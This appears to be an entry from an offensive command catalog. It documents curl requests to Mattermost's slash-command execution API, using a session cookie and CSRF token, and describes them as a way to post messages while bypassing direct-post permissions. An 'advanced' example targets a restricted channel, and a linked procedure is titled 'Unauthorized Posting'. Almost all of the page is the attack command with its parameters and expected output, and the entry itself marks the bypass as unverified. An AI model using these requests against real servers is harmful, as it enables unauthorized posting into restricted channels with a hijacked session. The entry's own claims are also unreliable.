---
id: cmd-uuid-001
name: mattermost-execute-slash-command
type: command
executor: bash
data: >-
  curl -X POST https://test3.cloud.mattermost.com/api/v4/commands/execute -H
  "Content-Type: application/json" -H "X-CSRF-Token:
  5jkue786iyfd6dkpiq7ftisys6y" -b "MMAUTHTOKEN=session_cookie" -d
  '{"command":"/echo
  ami","channel_id":"khhnkrf5wf8yibwx8bd14s6fbw","team_id":"8jdphis493d4pbq3u1bagz643r"}'
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:07.278Z'
platforms:
  - Web
tags:
  - mattermost
  - api
  - slash-command
verified: false
validated: true
submitted: true
---

# mattermost-execute-slash-command

## Command

```bash
curl -X POST https://your-mattermost-instance.com/api/v4/commands/execute \
  -H "Content-Type: application/json" \
  -H "X-CSRF-Token: YOUR_CSRF_TOKEN" \
  -b "MMAUTHTOKEN=YOUR_SESSION_COOKIE" \
  -d '{"command":"/echo test_message","channel_id":"TARGET_CHANNEL_ID","team_id":"TARGET_TEAM_ID"}'
```

## Description

This command executes a slash command via the Mattermost API to post a message in a channel, bypassing direct post permissions. It targets the /api/v4/commands/execute endpoint with a JSON payload containing the command, channel, and team details.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `https://your-mattermost-instance.com/api/v4/commands/execute` | Target API endpoint URL | Yes |
| `-H "Content-Type: application/json"` | Sets JSON payload format | Yes |
| `-H "X-CSRF-Token: YOUR_CSRF_TOKEN"` | Anti-CSRF protection token from session | Yes |
| `-b "MMAUTHTOKEN=YOUR_SESSION_COOKIE"` | Authentication cookie for valid user session | Yes |
| `-d '{"command":"/echo test_message",...}'` | JSON body with command, channel_id, and team_id | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://test3.cloud.mattermost.com/api/v4/commands/execute \
  -H "Content-Type: application/json" \
  -H "X-CSRF-Token: 5jkue786iyfd6dkpiq7ftisys6y" \
  -b "MMAUTHTOKEN=session_cookie" \
  -d '{"command":"/echo ami","channel_id":"khhnkrf5wf8yibwx8bd14s6fbw","team_id":"8jdphis493d4pbq3u1bagz643r"}'
```

### Advanced Usage

```bash
curl -X POST https://test3.cloud.mattermost.com/api/v4/commands/execute \
  -H "Content-Type: application/json" \
  -H "X-CSRF-Token: 5jkue786iyfd6dkpiq7ftisys6y" \
  -b "MMAUTHTOKEN=session_cookie" \
  -v \
  -d '{"command":"/echo sensitive_data","channel_id":"restricted_channel_id","team_id":"team_id"}'
```

## Expected Output

Successful execution returns an HTTP 200 response with JSON like {"response": {"text": "ami"}}, and the message 'ami' is posted to the channel. Errors include 403 Forbidden if permissions are enforced or 400 Bad Request for invalid payload.

## Related

- [[Related Procedure: Execute-Mattermost-Slash-Command-for-Unauthorized-Posting]]
